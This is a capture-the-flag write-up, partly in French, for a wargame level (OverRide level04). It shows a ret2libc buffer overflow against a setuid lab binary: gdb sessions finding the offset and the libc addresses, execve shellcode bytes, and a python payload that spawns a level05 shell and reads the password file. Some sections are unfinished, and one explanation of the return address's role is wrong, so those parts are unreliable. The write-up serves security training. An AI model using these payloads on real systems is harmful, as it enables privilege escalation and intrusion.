# LEVEL04

## 1. Inspect The Executable

```bash
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level04/level04
level04@OverRide:~$ ls -l
total 8
-rwsr-s---+ 1 level05 users 7797 Sep 10  2016 level04
```

We can see that the binary has the `s` bit set on the **execution permission**, which means the program will run with **`level05` privileges**.

```bash
level04@OverRide:~$ ./level04 
Give me some shellcode, k
shellcode
child is exiting...
level04@OverRide:~$ ./level04 
Give me some shellcode, k
\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80
child is exiting...
level04@OverRide:~$ ./level04 
Give me some shellcode, k
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
child is exiting...
level04@OverRide:~$ ./level04 
Give me some shellcode, k
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
^C
```

The program asks for a shellcode, and look like the stop a fork process.

## 2. Analyze The Executable

```bash
(gdb) info functions 
All defined functions:

Non-debugging symbols:
[...]
0x08048494  main
[...]
```

Using the gdb command `info functions`, we can list all functions present in the binary.
Here, we find only the function: `main`.

### Program Behavior

#### main function

The `main` function first launch a `fork()` process. If the process is the child process, it calls `ptrace(PTRACE_TRACEME,0,0,0)` to follow it own process. Then `gets()` the input of the user. If not, it `wait` the fork process, then stop the program (by )....

## 3. Identify The Vulnerability

For this level, we gonna use a new attack : **ret2libc**.

### RET2LIBC Explanation

The `ret2libc`, or return to the library C, use the function and string stored in the C library. The payload is as follow :
```
[ padding ] [ system() address ] [ ret address of system() ] [ "/bin/sh" address ]
└────┬────┘ └─────────┬────────┘ └────────────┬────────────┘ └─────────┬─────────┘
	 ?				  4						  4						   4

The size of padding depends on how many bytes it need to overflow on the saved EIP.
```

The idea is to overwrite saved EIP with the system() address to redirect the process to it. Aside of the system() address, we putting where we want the process to go after the system() function, and next to it it the argument of the system() calls.

The `ret address` is there to secure the attack from the NX process, that detect is the program value has change during the process.

To understand why this information are in this order, we need to observe what's happening during a new call in the stack.

#### Stack New Function Call

Stack on function 1:
```
Adresse haute
┌─────────────────────────────────────────┐
│  ...           │  autres args           │
├─────────────────────────────────────────┤
│  EBP + 12      │  arg 2 funct 1         │
├─────────────────────────────────────────┤
│  EBP + 8       │  arg 1 funct 1         │
├─────────────────────────────────────────┤
│  EBP + 4       │  saved EIP             │
├─────────────────────────────────────────┤
│  EBP           │  saved EBP             │
├─────────────────────────────────────────┤
│  EBP - 4       │  début vars locales    │
├─────────────────────────────────────────┤
│  ...           │  ...                   │  ← ESP
└─────────────────────────────────────────┘
Adresse basse
```

Stack finish function 1, `leave`.
leave : move esp, ebp.

ESP remonte au niveau d'EBP.

```
Adresse haute
┌─────────────────────────────────────────┐
│  ...           │  autres args           │
├─────────────────────────────────────────┤
│  EBP + 12      │  arg 2 funct 1         │
├─────────────────────────────────────────┤
│  EBP + 8       │  arg 1 funct 1         │
├─────────────────────────────────────────┤
│  EBP + 4       │  saved EIP             │
├─────────────────────────────────────────┤
│  EBP           │  saved EBP             │ ← ESP
├─────────────────────────────────────────┤
│  EBP - 4       │  début vars locales    │ --- ne sont plus interresante car sous ESP
├─────────────────────────────────────────┤
│  ...           │  ...                   │  
└─────────────────────────────────────────┘
Adresse basse
```
leave : pop ebp.
Le padding est poppé dans EBP. ESP avance de 4.
epb = SAVED EBP

```
Adresse haute
┌─────────────────────────────────────────┐
│  ...           │  autres args           │
├─────────────────────────────────────────┤
│	nowhere		 │  arg 2 funct 1         │
├─────────────────────────────────────────┤
│	nowhere		 │  arg 1 funct 1         │
├─────────────────────────────────────────┤
│	nowhere		 │  saved EIP             │ ← ESP
├─────────────────────────────────────────┤
│	nowhere		 │  début vars locales    │ --- ne sont plus interresante car sous ESP
├─────────────────────────────────────────┤
│  ...           │  ...                   │  
└─────────────────────────────────────────┘
Adresse basse
```

Stack finish function 1, `ret`.
ret : pop eip
eip = SAVED EIP

```
Adresse haute
┌─────────────────────────────────────────┐
│  ...           │  autres args           │
├─────────────────────────────────────────┤
│	nowhere		 │  arg 2 funct 1         │
├─────────────────────────────────────────┤
│	nowhere		 │  arg 1 funct 1		  │ ← ESP
├─────────────────────────────────────────┤
│	nowhere		 │  début vars locales    │ --- ne sont plus interresante car sous ESP
├─────────────────────────────────────────┤
│  ...           │  ...                   │  
└─────────────────────────────────────────┘
Adresse basse
```
 ... ? ...


Donc lors de la ret2libc attack, il se passe :

#### ret2libc Visualization

... ? ...

### Get Exploit Values

First we need to determiner the size of the padding.

```bash
(gdb) set follow-fork-mode child
(gdb) r
Starting program: /home/users/level04/level04 
[New process 1894]
Give me some shellcode, k
aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzzAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 1894]
0x4e4e4e4e in ?? ()
```

`set follow-fork-mode child` is a gdb command that allows to continue the debugging in the child process (in case of fork() calls).

`0x4e` is 78 in decimal and `N` in ASCII. So we got a offset of `156 bytes`.

---

Then lets found the addresses of the payload.

```bash
(gdb) r <<< $(python -c 'print "a" * 156 + "BBBB"')
Starting program: /home/users/level04/level04 <<< $(python -c 'print "a" * 156 + "BBBB"')
[New process 1949]
Give me some shellcode, k

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 1949]
0x42424242 in ?? ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) p exit
$1 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
```

We found the address of system : `` and exit : ``.

To get the address of the string "/bin/sh" is more difficult:
```bash
(gdb) info proc map
process 1949
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/users/level04/level04
	 0x8049000  0x804a000     0x1000        0x0 /home/users/level04/level04
	 0x804a000  0x804b000     0x1000     0x1000 /home/users/level04/level04
	0xf7e2b000 0xf7e2c000     0x1000        0x0 
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
	0xf7fd0000 0xf7fd4000     0x4000        0x0 
	0xf7fd8000 0xf7fda000     0x2000        0x0 
	0xf7fda000 0xf7fdb000     0x1000        0x0 
	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
0xf7f897ec
1 pattern found.
```

We need the the mapped address of the process, to found the address of the `libc` :
```bash
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
```

Then we use the command `find` of gdb *(search a word between the start and end address)*, to search in the libc memory area "/bin/sh". 

### Create the Payload

```bash
python -c 'print "a" * 156 + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1]'
```

But the address of `exit` is not important in this level :
```bash
python -c 'print "a" * 156 + "\xf7\xe6\xae\xd0"[::-1] + "b" * 4 + "\xf7\xf8\x97\xec"[::-1]'
```

### Attack Visualization

[img - ]

## 4. Capture The Flag

```bash
level04@OverRide:~$ (python -c 'print "a" * 156 + "\xf7\xe6\xae\xd0"[::-1] + "b" * 4 + "\xf7\xf8\x97\xec"[::-1]'; cat) | ./level04 
Give me some shellcode, k
id
cuid=1004(level04) gid=1004(level04) euid=1005(level05) egid=100(users) groups=1005(level05),100(users),1004(level04)
cat /home/users/level05/.pass
XXX
^C
```